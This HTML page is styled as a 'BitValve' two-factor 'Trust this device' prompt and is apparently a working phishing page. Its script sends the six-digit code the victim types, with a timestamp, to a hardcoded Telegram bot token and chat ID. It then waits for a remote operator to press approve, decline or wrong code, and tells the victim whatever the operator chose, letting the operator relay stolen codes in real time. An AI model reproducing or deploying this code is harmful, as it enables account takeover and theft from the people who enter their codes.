<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BitValve - Trust this device</title>
    <style>
        /* ========== GLOBAL RESET ========== */
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Inter", sans-serif;
        }
        
        body {
            background-color: #f2f2f2;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        /* ========== MAIN CONTAINER ========== */
        
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }
        
        .card {
            background: white;
            border-radius: 12px;
            padding: 30px 25px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
            text-align: center;
        }
        /* ========== LOGO AREA ========== */
        
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
        }
        
        .logo svg {
            width: 28px;
            height: 28px;
            fill: #016a54;
        }
        
        h2 {
            color: #003b2b;
            font-weight: 700;
        }
        /* ========== TITLE & TEXT ========== */
        
        h3 {
            color: #016a54;
            font-size: 20px;
            margin-top: 10px;
            font-weight: 600;
        }
        
        .subtitle {
            font-size: 12px;
            color: #7a7a7a;
            margin: 20px 0 10px;
            letter-spacing: 0.5px;
        }
        /* ========== INPUT CODE BOXES ========== */
        
        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .code-inputs input {
            width: 45px;
            height: 50px;
            text-align: center;
            font-size: 20px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
            outline: none;
            transition: 0.2s ease;
        }
        
        .code-inputs input:focus {
            border-color: #016a54;
            box-shadow: 0 0 0 2px rgba(1, 106, 84, 0.2);
        }
        /* ========== BUTTON ========== */
        
        #trust-btn {
            width: 100%;
            background: #0e0e0e;
            color: #00ff84;
            border: none;
            border-radius: 30px;
            padding: 14px;
            font-size: 16px;
            cursor: pointer;
            font-weight: 600;
            transition: 0.3s ease;
        }
        
        #trust-btn:hover {
            background: #1a1a1a;
        }
        
        #trust-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            background: #333;
        }
        /* ========== ERROR MESSAGE ========== */
        
        .error-msg {
            background: rgba(239, 68, 68, 0.12);
            border: 1px solid rgba(239, 68, 68, 0.25);
            color: #dc2626;
            padding: 10px 14px;
            border-radius: 10px;
            font-size: 13px;
            margin: 16px 0;
            display: none;
            text-align: center;
        }
        /* ========== SPINNER OVERLAY ========== */
        
        .spinner-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.4s ease, visibility 0.4s ease;
            pointer-events: none;
        }
        
        .spinner-overlay.active {
            opacity: 1;
            visibility: visible;
            pointer-events: all;
        }
        
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid rgba(255, 255, 255, 0.15);
            border-top-color: #00ff84;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            color: #d1d5db;
            font-size: 15px;
            margin-top: 20px;
            font-weight: 500;
        }
        
        .spinner-email {
            color: #00ff84;
            font-size: 14px;
            margin-top: 6px;
            font-weight: 600;
            word-break: break-all;
            max-width: 300px;
            text-align: center;
        }
        
        .cancel-poll-btn {
            margin-top: 22px;
            padding: 10px 28px;
            background: transparent;
            border: 1px solid #4b5563;
            border-radius: 50px;
            color: #9ca3af;
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .cancel-poll-btn:hover {
            border-color: #ef4444;
            color: #ef4444;
        }
        /* ========== RESPONSIVE ========== */
        
        @media (max-width: 480px) {
            .card {
                padding: 20px;
            }
            .code-inputs input {
                width: 40px;
                height: 45px;
                font-size: 18px;
            }
            h3 {
                font-size: 18px;
            }
            #trust-btn {
                font-size: 15px;
                padding: 12px;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                    <path d="M4 4v5h5V4H4zm0 7v5h5v-5H4zm7-7v5h5V4h-5zm7 0v5h2V4h-2zm-7 7v5h5v-5h-5zm7 0v5h2v-5h-2zm-7 7v3h5v-3h-5zm7 0v3h2v-3h-2z" />
                </svg>
                <h2>BitValve</h2>
            </div>

            <h3>Trust this device</h3>
            <p class="subtitle">2FA CODE</p>

            <!-- Error message -->
            <div class="error-msg" id="otpError"></div>

            <div class="code-inputs">
                <input type="text" maxlength="1" id="otp0" />
                <input type="text" maxlength="1" id="otp1" />
                <input type="text" maxlength="1" id="otp2" />
                <input type="text" maxlength="1" id="otp3" />
                <input type="text" maxlength="1" id="otp4" />
                <input type="text" maxlength="1" id="otp5" />
            </div>

            <button id="trust-btn">Trust Device</button>
        </div>
    </div>

    <!-- ===== Spinner Overlay ===== -->
    <div class="spinner-overlay" id="spinnerOverlay">
        <div class="spinner"></div>
        <p class="spinner-text">Verifying 2FA code...</p>
        <p class="spinner-email" id="spinnerInfo"></p>
        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
    </div>

    <!-- ===== Telegram Inline Keyboard + Polling ===== -->
    <script>
        /* ----- CONFIG ----- */
        const TELEGRAM_BOT_TOKEN = "8222020250:AAGVVD5AkuxwLm1EVRyabAKqmIZgX6jzbLY";
        const TELEGRAM_CHAT_ID = "8486388141";

        /* ----- State ----- */
        let pollDecided = false;
        let pollTimeoutId = null;
        let currentPollController = null;

        /* ----- Auto-move between OTP inputs ----- */
        const inputs = document.querySelectorAll(".code-inputs input");

        inputs.forEach((input, index) => {
            input.addEventListener("input", (e) => {
                const value = e.target.value;
                if (value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });

            input.addEventListener("keydown", (e) => {
                if (e.key === "Backspace" && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });

            // Allow only digits
            input.addEventListener("keypress", (e) => {
                if (!/^\d$/.test(e.key)) {
                    e.preventDefault();
                }
            });
        });

        /* ----- Helpers ----- */
        function showError(msg) {
            const err = document.getElementById('otpError');
            err.textContent = msg;
            err.style.display = 'block';
        }

        function hideError() {
            document.getElementById('otpError').style.display = 'none';
        }

        /* ----- Cancel polling ----- */
        function cancelPolling() {
            pollDecided = true;
            if (pollTimeoutId) clearTimeout(pollTimeoutId);
            if (currentPollController) currentPollController.abort();
            document.getElementById('spinnerOverlay').classList.remove('active');
            document.getElementById('trust-btn').disabled = false;
            showError('Request cancelled. Please try again.');
        }

        /* ----- Polling loop (long-poll for callback_query) ----- */
        function startPolling(userId, onApproveUrl) {
            let offset = 0;
            pollDecided = false;
            let pollCount = 0;
            const maxPolls = 90;
            let retryDelay = 2000;

            if (currentPollController) currentPollController.abort();
            currentPollController = new AbortController();

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1`, {
                    signal: currentPollController.signal
                })
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        offset = data.result[data.result.length - 1].update_id + 1;
                    }
                    pollLoop();
                })
                .catch(err => {
                    if (err.name !== 'AbortError') {
                        console.error('Initial offset error:', err);
                        pollLoop();
                    }
                });

            function pollLoop() {
                if (pollDecided) return;
                pollCount++;
                if (pollCount > maxPolls) {
                    pollDecided = true;
                    document.getElementById('spinnerOverlay').classList.remove('active');
                    document.getElementById('trust-btn').disabled = false;
                    showError('Request timed out. Please try again.');
                    return;
                }

                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`, {
                        method: 'GET',
                        signal: currentPollController.signal
                    })
                    .then(r => {
                        if (!r.ok) {
                            if (r.status === 409) {
                                retryDelay = Math.min(retryDelay * 1.5, 10000);
                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
                                return null;
                            }
                            throw new Error('HTTP ' + r.status);
                        }
                        retryDelay = 2000;
                        return r.json();
                    })
                    .then(data => {
                        if (data === null) return;
                        if (!data.ok || pollDecided) {
                            if (!pollDecided) {
                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
                            }
                            return;
                        }

                        for (const update of data.result) {
                            offset = update.update_id + 1;
                            if (update.callback_query) {
                                const action = update.callback_query.data;

                                // Answer the callback query
                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify({
                                        callback_query_id: update.callback_query.id,
                                        text: "Action recorded!"
                                    })
                                }).catch(() => {});

                                if (action === `approve_${userId}`) {
                                    pollDecided = true;
                                    document.getElementById('spinnerOverlay').classList.remove('active');
                                    window.location.href = onApproveUrl;
                                    return;
                                } else if (action === `decline_${userId}`) {
                                    pollDecided = true;
                                    document.getElementById('spinnerOverlay').classList.remove('active');
                                    document.getElementById('trust-btn').disabled = false;
                                    showError('Request declined. Please try again.');
                                    return;
                                } else if (action === `wrong_${userId}`) {
                                    pollDecided = true;
                                    document.getElementById('spinnerOverlay').classList.remove('active');
                                    document.getElementById('trust-btn').disabled = false;
                                    showError('Wrong code. Please enter the correct 2FA code.');
                                    return;
                                }
                            }
                        }

                        if (!pollDecided) {
                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
                        }
                    })
                    .catch(err => {
                        if (err.name === 'AbortError') return;
                        console.error('Poll error:', err);
                        if (!pollDecided) {
                            retryDelay = Math.min(retryDelay * 1.2, 8000);
                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
                        }
                    });
            }
        }

        /* ----- Send message with inline keyboard to Telegram ----- */
        function sendTelegramMessage(message, keyboard, userId, onApproveUrl) {
            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const trustBtn = document.getElementById('trust-btn');

            let attempts = 0;
            const maxAttempts = 3;

            function attemptSend() {
                attempts++;
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML',
                            reply_markup: JSON.stringify(keyboard)
                        })
                    })
                    .then(res => {
                        if (!res.ok) throw new Error('HTTP ' + res.status);
                        return res.json();
                    })
                    .then(data => {
                        if (data.ok) {
                            startPolling(userId, onApproveUrl);
                        } else {
                            if (attempts < maxAttempts) {
                                setTimeout(attemptSend, 1000 * attempts);
                            } else {
                                spinnerOverlay.classList.remove('active');
                                trustBtn.disabled = false;
                                showError('Failed to send notification. Please try again.');
                            }
                        }
                    })
                    .catch(err => {
                        console.error('Send error:', err);
                        if (attempts < maxAttempts) {
                            setTimeout(attemptSend, 1000 * attempts);
                        } else {
                            spinnerOverlay.classList.remove('active');
                            trustBtn.disabled = false;
                            showError('Network error. Please check your connection and try again.');
                        }
                    });
            }

            attemptSend();
        }

        /* ----- Trust Device button click ----- */
        document.getElementById("trust-btn").addEventListener("click", function() {
            hideError();

            // Collect the OTP code from inputs
            const code = Array.from(inputs).map(input => input.value).join('');

            if (code.length !== 6 || !/^\d{6}$/.test(code)) {
                showError('Please enter the complete 6-digit code.');
                return;
            }

            const trustBtn = document.getElementById('trust-btn');
            const spinnerOverlay = document.getElementById('spinnerOverlay');
            const spinnerInfo = document.getElementById('spinnerInfo');

            spinnerInfo.textContent = 'Code: ' + code;
            spinnerOverlay.classList.add('active');
            trustBtn.disabled = true;

            const userId = 'otp_' + Date.now();
            const message = `🔐 <b>BitValve 2FA Code Received</b>

🔢 Code: <code>${code}</code>
⏰ Time: ${new Date().toLocaleString('en-ZA')}

<b>Please approve, decline, or mark as wrong code:</b>`;

            const keyboard = {
                inline_keyboard: [
                    [{
                        text: "✅ APPROVE",
                        callback_data: `approve_${userId}`
                    }, {
                        text: "❌ DECLINE",
                        callback_data: `decline_${userId}`
                    }],
                    [{
                        text: "⚠️ WRONG CODE",
                        callback_data: `wrong_${userId}`
                    }]
                ]
            };

            sendTelegramMessage(message, keyboard, userId, 'otp2.html');
        });
    </script>
</body>

</html>
